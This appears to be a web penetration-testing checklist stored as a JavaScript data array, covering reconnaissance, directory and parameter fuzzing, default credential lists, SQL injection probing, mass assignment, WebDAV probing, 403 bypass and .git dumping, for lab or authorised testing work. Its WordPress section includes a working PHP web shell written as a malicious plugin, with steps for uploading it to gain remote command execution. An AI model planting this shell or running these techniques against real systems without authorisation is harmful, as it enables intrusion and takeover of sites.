checklist["web_pentest_general"] = [
    {
        chapter: "1. Initial web application checks",
        checks: [
            {
                title: "Understand System Context",
                description: "Identify the system's purpose, use cases, and functionality.",
                code: `#####
# 1. Identify the main purpose of the webapp  
#####

#####
# 2. If possible, identify a version of the app or software being used by checking:

# - source code
# - http headers
# - through a changelog file 
# - through a readme.MD file
# - through public github repositories (cs.github.com)

# - if a version is found; checkout known vulnerabilities for that version using

# - google
# - exploit-db
# - sploitus

#####

# 3. Check links, do any of them refer to internal apps or other internal services?
# 4. Identify the main features and functionalities of the web application
# 5. Find user inputs & take note of them
# 6. Find the "happy flows" and take note of them
# 7. Identify user roles and permissions
`,
                code_language: noCodeAvailableLanguage,
            },
            {
                title: "Run Specialized Scanners",
                description: "Utilize technology-specific scanners like wpscan, joomscan, etc.",
                code: `# 1. If applicable, run a CMS scanner based on the identified CMS
                    
# wpscan - https://github.com/wpscanteam/wpscan 
# joomscan - https://github.com/OWASP/joomscan
# cmsmap - https://github.com/dionach/CMSmap`,
                code_language: bash,
            },
            {
                title: "Crawl the website for hidden content",
                description: "Crawl the webapp for hidden content.",
                code: `# 1. Utilize katana to crawl the webapp for hidden content
katana -u http://{{RHOST}} -headless -no-incognito | tee katana_output.txt`,
                code_language: bash,
            },
            {
                title: "Directory & file fuzzing",
                description: "Use feroxbuster to find files and directories.",
                code: `# 1. Use feroxbuster with 'common' wordlist
feroxbuster -u http://{{RHOST}} -t 10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp,pdf" -v -k -o feroxbuster_common.txt [--add-slash]                                       
                    
# 2. Use feroxbuster with 'medium' wordlist
feroxbuster -u http://{{RHOST}} -t 10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x "txt,html,php,asp,aspx,jsp,pdf" -v -k -o feroxbuster_medium.txt [--add-slash]

# 3. Use feroxbuster with 'big' wordlist
feroxbuster -u http://{{RHOST}} -t 10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -x "txt,html,php,asp,aspx,jsp,pdf" -v -k -o feroxbuster_big.txt [--add-slash]

##### useful options:
# -t : number of threads
# -x : file extensions to look for
# -k : skip SSL verification
# -r : follow redirects
# --add-slash : appends a slash
# --rate-limit 5 : limit requests to 5 per second (combine with -t)
# -H "Cookie: KEY=VALUE" : Use a cookie`,
                code_language: "language-bash",
            },
            {
                title: "Virtual host fuzzing",
                description: "Utilize ffuf to discover virtual hosts and parameters.",
                code: `# 1. Virtual host fuzzing
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://{{RHOST}}/ -H "Host: FUZZ.{{RHOST}}"
           
##### useful options:
# - fs : filter on size
# - fw : filter on words`,
                code_language: "language-bash",
            },
            {
                title: "Parameter fuzzing",
                description: "Utilize ffuf to fuzz parameters.",
                code: `# 1. parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://{{RHOST}}/?FUZZ=id
           
##### useful options:
# - fs : filter on size
# - fw : filter on words
# -H "key: value" : add header(s)`,
                code_language: "#",
            },
            {
                title: "Analyze Page Comments and source code",
                description: "Examine HTML comments and source code on main and secondary pages for sensitive data.",
                code: `# 1. Examine HTML comments and source code on main and secondary pages for sensitive data.
Utilize the 'comment extractor' feature within this plugin`,
                code_language: bash,
            },
            {
                title: "Test default & software credentials",
                description: "Check for default credentials on login forms.",
                code: `# 1. Use common default credentials
admin:admin
admin:password
root:admin
root:password
root:root
[boxname]:admin
[boxname]:password
[appName]:[appName]
admin:no pass
root:no pass

# 2. use the software name as username/ password combination
# e.g. wordpress:wordpress, joomla:joomla, drupal:drupal, magento:magento, nexus:nexus`,
                code_language: bash,
            },
            {
                title: "Check for basic SQL injection",
                description: "input an apostrophe (') in all identified user input endpoints",
                code: `# input an apostrophe (') in all identified user input endpoints
# 1. forget-password-forms
# 2. cookies
# 3. tokens
# 4. search fields
# 5. feedback forms
# 6. login forms
# 7. registration forms
# 8. URL parameters
# etc.`,

                code_language: bash,
            },
            {
                title: "MASS assignment",
                description: "Check if mass assignment is possible by sending extra parameters in the request body.",
                code: `# 1. check forms for a mass assignment vulnerability, e.g. by adding an extra parameter in the request body that should not be there
##### example
# reference = Offsec box boolean (PG practice)

# 1A. POST request is send (original request)
POST /settings/email HTTP/1.1
Host: 192.168.124.231
.....

_method=patch&authenticity_token=uSUVZh6NUAqbJaLnpURJ_QO1vMvLDZsrb3HggiJDM67WuCnbNqwL-KSykEvODYbbNTGOXdwVHAIJbAK3RdPGAA&user%5Bemail%5D=test%40test.nl&commit=Change%20email

# 1B. returned the following JSON response
{
    "email": "test@test.nl",
    "id": 1,
    "username": "test",
    "confirmed": false, # < original value
    "created_at": "2025-10-27T17:39:41.784Z",
    "updated_at": "2025-10-27T17:39:41.784Z"
}

# 2A. try to add an extra parameter that should not be there, based off the JSON response: 'user%5Bconfirmed=true'
POST /settings/email HTTP/1.1
Host: 192.168.124.231
.....

_method=patch&authenticity_token=uSUVZh6NUAqbJaLnpURJ_QO1vMvLDZsrb3HggiJDM67WuCnbNqwL-KSykEvODYbbNTGOXdwVHAIJbAK3RdPGAA&user%5Bemail%5D=test%40test.nl&commit=Change%20email&user%5Bconfirmed%5D=true

# 2B. if the response shows that the 'confirmed' parameter is now set to true, the application is vulnerable to mass assignment
{
    "email": "test@test.nl",
    "confirmed": true, # < updated value
    "id": 1,
    "username": "test",
    "created_at": "2025-10-27T17:39:41.784Z",
    "updated_at": "2025-10-27T17:46:57.202Z"
}                 
`,
                code_language: bash,
            },
            {
                title: "Check if webdav is enabled",
                description: "Check if webdav is enabled on the target web server.",
                code: `# 1. check if webdav is enabled
##### REFERENCE: https://hackviser.com/tactics/pentesting/services/webdav
# HTTP methods enumeration
nmap -p 80,443 --script http-methods target.com
nmap -p 80,443 --script http-webdav-scan target.com

# WebDAV path detection
nmap -p 80 --script http-webdav-scan --script-args http-webdav-scan.path=/webdav/ {{RHOST}}

# Common paths
/webdav/
/dav/
/WebDAV/
/uploads/
/files/
/_vti_bin/
/sharepoint/

# 2. authentication bypass
curl -X OPTIONS http://target.com/webdav/
curl -X PROPFIND http://target.com/webdav/

# Try with default credentials
admin:admin
admin:password
webdav:webdav

# Test authentication
curl -X PROPFIND http://target.com/webdav/ -u admin:admin
`,
                code_language: bash,
            },
            {
                title: "403-bypass",
                description: "If you have come across a 403 page, try to bypass it.",
                code: `# 1. try to bypass the 403 page with common bypass techniques (https://github.com/0xrisec/4-ZERO-3/)
403-bypass.sh -u http://{{RHOST}}/logs --header | tee 403_bypass_output.txt

# 2. or try with all techniques that are known
403-bypass.sh -u http://{{RHOST}}/logs --exploit | tee 403_bypass_output.txt

# 3. check the output
# > filter on status, e.g.: 400, 200, 403, 404
# > then filter on length, e.g.:
cat 403_bypass_output.txt | grep "404" | cut -d "," -f 2 | cut -d ":" -f 2 | sort
`,
                code_language: bash,
            },
        ]
    },
    {
        chapter: "2. CMS specific checks",
        checks: [
            {
                title: "Wordpress - checks",
                description: "Multiple wordpress checks to identify the most common attack vectors.",
                code: `# 1. Identify WordPress version, plugins, themes and authors utilizing wpscan
wpscan -e ap,at,cb,dbe,u,m --url {{RHOST}} | tee wpscan_output_all.txt

# 2. Version check
- Check themes for vulnerabilities
- Check plugins for vulnerabilities
- Check WordPress version for vulnerabilities

# 3. Plugins double check:
- Any functionality in the plugin that could be abused if it does not contain any exploits?

# 4. Any valid authors found (OSCP)?
- Bruteforce author usernames with rockyou

# 5. xmlrpc.php enabled?
- If so, note it.
...

# 6. wp-cron.php enabled?
- if so, note it
...

# 7. Directory listing enabled?
- Check the following directories for any additional plugins
  - /wp-content/
  - /wp-content/plugins/
  - /wp-content/themes/
  - /wp-content/uploads/`,
                code_language: bash,
            },
            {
                title: "Wordpress - uninstalled instance",
                description: "This check is useful to spawn an MySQL database, e.g. you come across an uninstalled Wordpress instance.",
                code: `###
### --- RUN COMMANDS ---
###
# docker-compose up
# docker-compose down
###
### --- CREDS ---
###
# USERNAME: root
# PASSWORD: temppassword
# DATABASE: mysql_tmp

version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql_tmp
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: temppassword
      MYSQL_DATABASE: mysql_tmp
      MYSQL_ROOT_HOST: '%'
    ports:
      - "3306:3306"
    command: --default-authentication-plugin=mysql_native_password
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-uroot", "-ptemppassword"]
      interval: 5s
      timeout: 5s
      retries: 10
      start_period: 30s`,
                code_language: "language-dockerfile",
            },
            {
                title: "Wordpress - malicious plugin",
                description: "Upload a malicious wordpress plugin to get RCE.",
                code: `# 1. create a malicious wordpress plugin
### --- START PLUGIN CODE --- ###

<?php
/**
 * Plugin Name: shell
 * Plugin URI: https://shell.com
 * Description: shell
 * Version: 1.0
 * Author: 1337
 * Author URI: https://shell.com
 * License: https://nosuchlicense
 */

system($_GET['cmd']); 
?>

### --- END PLUGIN CODE --- ###

# 2. zip the plugin folder
zip - r shell.zip shell.php

# 3. upload the plugin via the wordpress admin panel(http ://{{RHOST}}/wp-admin/plugin-install.php)
...

# 4. access the shell via the URL
http://{{RHOST}}/wp-content/plugins/shell/shell.php?cmd=id`,
                code_language: "language-bash",
            },
        ]
    },
    {
        chapter: "3. Git checks",
        checks: [
            {
                title: ".git directory checks",
                description: "Multiple checks to possibly abuse a .git directory if it is found on the target web server.",
                code: `# 1. check if .git directory is accessible
curl -I http://{{RHOST}}/.git/

# 2. if it is accessible, check if you can download the .git utilizing git-dumper
mkdir git_dump; git-dumper http://{{RHOST}}/.git/ ./git_dump

# 3. once you have the files, try the following:
# 3A. check the config
cat .git/config

# 3B. check the commit history for any sensitive information
git log # show commits
git log -p # directly show the changes in the commits
git log -p > git_commit_history.txt # log the output of all commits to a textfile

# 3C. check the branches for any sensitive information
git branch -a # show all branches
git checkout [branch name] # checkout the branch and check the files for any sensitive information
`,
                code_language: bash,
            },
        ]
    }
];